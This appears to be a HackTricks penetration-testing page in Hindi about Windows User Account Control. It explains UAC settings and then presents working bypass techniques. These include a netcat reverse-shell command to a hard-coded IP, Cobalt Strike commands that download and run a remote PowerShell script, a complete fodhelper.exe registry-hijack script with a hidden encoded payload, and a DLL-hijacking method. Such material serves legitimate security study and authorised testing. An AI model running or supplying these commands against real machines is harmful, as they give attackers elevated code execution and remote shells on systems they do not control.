# UAC - यूज़र अकाउंट कंट्रोल

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक ऐसी सुविधा है जो उच्चाधिकार (elevated) गतिविधियों के लिए **सहमति प्रांप्ट (consent prompt)** सक्षम करती है। Applications के अलग-अलग `integrity` स्तर होते हैं, और एक प्रोग्राम जिसके पास **high level** होता है वह ऐसे कार्य कर सकता है जो **संभवतः सिस्टम को खतरे में डाल सकते हैं**। जब UAC सक्षम होता है, तो Applications और टास्क हमेशा **एक non-administrator अकाउंट के सुरक्षा संदर्भ (security context)** के तहत चलते हैं जब तक कि किसी व्यवस्थापक (administrator) ने स्पष्ट रूप से उन applications/टास्क को सिस्टम पर एडमिन-स्तरीय पहुँच देने के लिए अधिकृत न किया हो। यह एक सुविधा है जो व्यवस्थापकों को अनइच्छित परिवर्तनों से बचाती है, पर इसे सुरक्षा सीमा (security boundary) नहीं माना जाता।

integrity levels के बारे में अधिक जानकारी के लिए:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

जब UAC लागू होता है, तो एक administrator user को 2 टोकन दिए जाते हैं: एक standard user टोकन, जो सामान्य स्तर पर नियमित कार्य करने के लिए होता है, और एक टोकन जिसमें admin privileges होते हैं।

यह [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC के काम करने के तरीके को गहराई से समझाता है और इसमें logon प्रक्रिया, user experience, और UAC आर्किटेक्चर शामिल हैं। व्यवस्थापक सुरक्षा नीतियों (security policies) का उपयोग करके UAC को अपनी संस्था के अनुसार लोकल स्तर पर (secpol.msc का उपयोग करते हुए) कॉन्फ़िगर कर सकते हैं, या Active Directory डोमेन वातावरण में Group Policy Objects (GPO) के जरिए कॉन्फ़िगर और पुश कर सकते हैं। विभिन्न सेटिंग्स का विवरण [here] पर दिया गया है। UAC के लिए सेट करने योग्य 10 Group Policy सेटिंग्स हैं। निम्न तालिका अतिरिक्त विवरण देती है:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | अक्षम                                                         |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | अक्षम                                                         |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | गैर‑Windows बाइनरीज़ के लिए सहमति के लिए प्रांप्ट            |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | सुरक्षित डेस्कटॉप पर क्रेडेंशियल्स के लिए प्रांप्ट            |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | सक्षम (डिफ़ॉल्ट — Home के लिए) अक्षम (डिफ़ॉल्ट — Enterprise के लिए) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | अक्षम                                                         |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | सक्षम                                                         |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | सक्षम                                                         |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | सक्षम                                                         |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | सक्षम                                                         |

### UAC Bypass Theory

कुछ प्रोग्राम्स स्वतः ही **autoelevated automatically** हो जाते हैं यदि **user** **administrator group** का सदस्य हो। इन बाइनरीज़ के _**Manifests**_ के अंदर _**autoElevate**_ विकल्प का मान _**True**_ होता है। बाइनरी को **Microsoft द्वारा साइन किया गया** होना भी आवश्यक है।

कई auto-elevate प्रक्रियाएँ **COM objects या RPC servers के माध्यम से कार्यक्षमता (functionality) एक्सपोज़** करती हैं, जिन्हें medium integrity (साधारण user-स्तरीय) प्रक्रियाओं से भी invoke किया जा सकता है। ध्यान दें कि COM (Component Object Model) और RPC (Remote Procedure Call) वे तरीके हैं जिनसे Windows प्रोग्राम अलग-अलग प्रक्रियाओं के बीच संवाद करते हैं और फ़ंक्शन्स को निष्पादित करते हैं। उदाहरण के लिए, **`IFileOperation COM object`** फ़ाइल संचालन (कॉपी, डिलीट, मूव) को संभालने के लिए डिज़ाइन किया गया है और बिना प्रांप्ट के स्वतः ही privileges को elevate कर सकता है।

ध्यान दें कि कुछ जाँचें की जा सकती हैं, जैसे यह चेक करना कि प्रक्रिया **System32 directory** से चलाई गई थी या नहीं, जिसे उदाहरण के लिए **explorer.exe** या किसी अन्य System32-स्थित executable में inject करके बाईपास किया जा सकता है।

इन जाँचों को बाईपास करने का एक और तरीका PEB को संशोधित (modify) करना है। Windows में हर प्रक्रिया का Process Environment Block (PEB) होता है, जिसमें प्रक्रिया के बारे में महत्वपूर्ण डेटा होता है, जैसे उसका executable path। PEB को संशोधित करके, हम अपनी खतरनाक प्रक्रिया के स्थान को फर्जी (spoof) कर सकते हैं, जिससे यह भरोसेमंद डायरेक्टरी (जैसे system32) से चलती हुई दिखे। यह spoofed जानकारी COM object को बिना उपयोगकर्ता से पूछे privileges auto-elevate करने के लिए धोखा देती है।

फिर, UAC को **बाईपास** करने के लिए (medium integrity स्तर से **high** तक उठाने के लिए) कुछ attackers इस तरह के बाइनरीज़ का उपयोग करके **arbitrary code execute** कराते हैं क्योंकि यह उच्च स्तर की integrity प्रक्रिया से चलाया जाएगा।

आप किसी बाइनरी के _**Manifest**_ की **जाँच** Sysinternals के टूल _**sigcheck.exe**_ से कर सकते हैं. (`sigcheck.exe -m <file>`) और आप प्रक्रियाओं के **integrity level** को _Process Explorer_ या _Process Monitor_ (Sysinternals के) का उपयोग करके देख सकते हैं।

### UAC की जाँच

UAC सक्षम है या नहीं यह सत्यापित करने के लिए करें:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
अगर यह **`1`** है तो UAC **सक्रिय** है, अगर यह **`0`** है या यह मौजूद ही नहीं है, तो UAC **निष्क्रिय** है।

फिर, जांचें कि **कौन सा स्तर** कॉन्फ़िगर किया गया है:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** तो, UAC prompt नहीं करेगा (जैसे **disabled**)
- If **`1`** तो admin से **username और password मांगे जाते हैं** ताकि binary को high rights के साथ चलाया जा सके (on Secure Desktop)
- If **`2`** (**Always notify me**) UAC हमेशा administrator से पुष्टि मांगेगा जब वह high privileges के साथ कुछ चलाने की कोशिश करेगा (on Secure Desktop)
- If **`3`** `1` जैसा लेकिन Secure Desktop पर जरूरी नहीं
- If **`4`** `2` जैसा लेकिन Secure Desktop पर जरूरी नहीं
- if **`5`**(**default**) यह administrator से पुष्टि मांगेगा कि non Windows binaries को high privileges के साथ चलाया जाए

फिर, आपको **`LocalAccountTokenFilterPolicy`** की value देखनी चाहिए\
यदि value **`0`** है, तो केवल **RID 500** user (**built-in Administrator**) ही **admin tasks without UAC** कर सकता है, और अगर यह `1` है, तो **"Administrators"** समूह के सभी खाते ये कर सकते हैं।

और अंत में **`FilterAdministratorToken`** key की value देखें\
यदि **`0`**(default) है, तो **built-in Administrator account** remote administration tasks कर सकता है और अगर **`1`** है तो built-in Administrator remote administration tasks नहीं कर सकता, जब तक कि `LocalAccountTokenFilterPolicy` को `1` पर सेट न किया गया हो।

#### सारांश

- If `EnableLUA=0` या **मौजूद नहीं है**, **किसी के लिए भी UAC नहीं**
- If `EnableLua=1` और **`LocalAccountTokenFilterPolicy=1`**, तो किसी के लिए भी UAC नहीं
- If `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=0`**, तो RID 500 (Built-in Administrator) के लिए UAC नहीं
- If `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=1`**, तो सभी के लिए UAC

यह सारी जानकारी **metasploit** module: `post/windows/gather/win_privs` का उपयोग करके इकट्ठी की जा सकती है

आप अपने उपयोगकर्ता के समूह भी देख सकते हैं और उसकी integrity level प्राप्त कर सकते हैं:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> ध्यान दें कि यदि आपके पास लक्षित मशीन तक ग्राफिकल एक्सेस है, तो UAC bypass सीधा होता है क्योंकि आप UAC prompt आने पर बस "Yes" पर क्लिक कर सकते हैं

UAC bypass की आवश्यकता निम्न स्थिति में होती है: **UAC सक्रिय है, आपका process medium integrity context में चल रहा है, और आपका user administrators group का सदस्य है**।

यह बताना महत्वपूर्ण है कि यह **UAC को बायपास करना बहुत कठिन है यदि यह सबसे उच्च सुरक्षा स्तर (Always) पर है बनाम अन्य किसी भी स्तर (Default) पर होने की तुलना में।**

### UAC disabled

यदि UAC पहले से disabled है (`ConsentPromptBehaviorAdmin` is **`0`**) तो आप **execute a reverse shell with admin privileges** (high integrity level) कुछ इस तरह उपयोग कर सकते हैं:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

यदि आपके पास ऐसा shell है जिस user का सदस्य Administrators group में है, तो आप लोकली SMB (file system) के माध्यम से साझा **mount the C$** को एक नए डिस्क में माउंट कर सकते हैं और आपको **access to everything inside the file system** मिलेगा (यहाँ तक कि Administrator home folder भी)।

> [!WARNING]
> **ऐसा लगता है कि यह ट्रिक अब काम नहीं कर रही है**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike तकनीकें केवल तभी काम करेंगी यदि UAC अपने अधिकतम सुरक्षा स्तर पर सेट नहीं है।
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में भी कई मॉड्यूल हैं जो **bypass** करने के लिए **UAC** का उपयोग करते हैं।

### KRBUACBypass

डॉक्यूमेंटेशन और टूल: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) जो कई UAC bypass exploits का एक **संकलन** है। ध्यान दें कि आपको **compile UACME using visual studio or msbuild** करना होगा। यह संकलन कई executables बनाएगा (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`), आपको पता होना चाहिए **कौन सा चाहिए।**\
आपको **सावधान** रहना चाहिए क्योंकि कुछ bypasses कुछ अन्य प्रोग्रामों को **prompt कर देंगे** जो **उपयोगकर्ता** को **सूचित** कर देंगे कि कुछ हो रहा है।

UACME में यह बताया गया है कि प्रत्येक technique किस **build version** से काम करना शुरू हुई। आप अपनी versions को प्रभावित करने वाली technique खोज सकते हैं:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

विश्वसनीय बाइनरी `fodhelper.exe` आधुनिक Windows पर auto-elevated होता है। इसे लॉन्च करने पर यह पर-यूज़र registry path को नीचे दिखाए अनुसार पूछता है और `DelegateExecute` verb को validate नहीं करता। वहाँ कोई command रख देने से एक Medium Integrity process (user Administrators में है) बिना UAC prompt के एक High Integrity process को spawn कर सकता है।

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell चरण (अपना payload सेट करें, फिर ट्रिगर करें):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- यह तभी काम करता है जब वर्तमान उपयोगकर्ता Administrators का सदस्य हो और UAC स्तर default/lenient हो (Always Notify जैसे अतिरिक्त प्रतिबंधों वाले स्तर पर नहीं)।
- Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
- Payload कोई भी कमांड हो सकती है (PowerShell, cmd, या किसी EXE का path)। stealth के लिये prompting UIs से बचें।

#### More UAC bypass

**सभी** उन techniques जिन्हें यहाँ UAC को bypass करने के लिए उपयोग किया गया है **AUC** को बायपास करने के लिए **पूर्ण interactive shell** की आवश्यकता होती है (एक सामान्य nc.exe shell पर्याप्त नहीं है)।

आप इसे **meterpreter** session के माध्यम से प्राप्त कर सकते हैं। ऐसे **process** में migrate करें जिसका **Session** मान **1** के बराबर हो:

![](<../../images/image (863).png>)

(_explorer.exe_ काम करेगा)

### UAC Bypass with GUI

यदि आपके पास **GUI** तक पहुँच है तो जब UAC prompt आए आप बस उसे accept कर सकते हैं, आपको वास्तव में bypass की जरूरत नहीं होती। इसलिए, GUI तक पहुँच मिलना UAC को बायपास करने की अनुमति देता है।

इसके अलावा, यदि आपको वही GUI session मिलती है जिसे कोई उपयोगकर्ता उपयोग कर रहा था (संभवतः RDP के माध्यम से), तो वहाँ कुछ tools ऐसे होंगे जो administrator के रूप में चल रहे होंगे जिनसे आप उदाहरण के लिए सीधे बिना UAC द्वारा फिर से पूछा जाए एक **cmd** को **as admin** चला सकते हैं, जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). यह थोड़ा अधिक **stealthy** हो सकता है।

### Noisy brute-force UAC bypass

यदि आपको शोरगुल की परवाह नहीं है तो आप हमेशा [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जैसे कुछ चला सकते हैं जो तब तक permissions बढ़ाने का अनुरोध करता रहेगा जब तक उपयोगकर्ता इसे स्वीकार नहीं कर लेता।

### Your own bypass - Basic UAC bypass methodology

यदि आप **UACME** को देखें तो आप पाएंगे कि अधिकांश UAC bypasses एक Dll Hijacking vulnerability का दुरुपयोग करते हैं (मुख्य रूप से malicious dll को _C:\Windows\System32_ पर लिखना)। [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. ऐसा binary ढूँढें जो **autoelevate** करे (जब इसे चलाया जाए तो यह high integrity level पर चलता है यह जांचें)।
2. procmon के साथ उन "**NAME NOT FOUND**" events को खोजें जो **DLL Hijacking** के लिये संवेदनशील हो सकती हैं।
3. शायद आपको कुछ **protected paths** (जैसे C:\Windows\System32) के अंदर DLL को **write** करना पड़ेगा जहाँ आपके पास लिखने की permissions नहीं होती। आप इसे निम्नलिखित तरीकों से बायपास कर सकते हैं:
1. **wusa.exe**: Windows 7,8 and 8.1। यह protected paths के अंदर CAB फाइल की सामग्री को extract करने की अनुमति देता है (क्योंकि यह tool high integrity level से executed होता है)।
2. **IFileOperation**: Windows 10।
4. एक **script** तैयार करें जो आपके DLL को protected path में copy करे और फिर vulnerable और autoelevated binary को execute करे।

### Another UAC bypass technique

यह इस बात पर निर्भर करता है कि क्या कोई **autoElevated binary** registry से किसी **binary** या **command** के **name/path** को **read** करने की कोशिश करता है जिसे **executed** किया जाना है (यह तब अधिक दिलचस्प होता है जब binary यह जानकारी **HKCU** के अंदर खोजता है)।

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
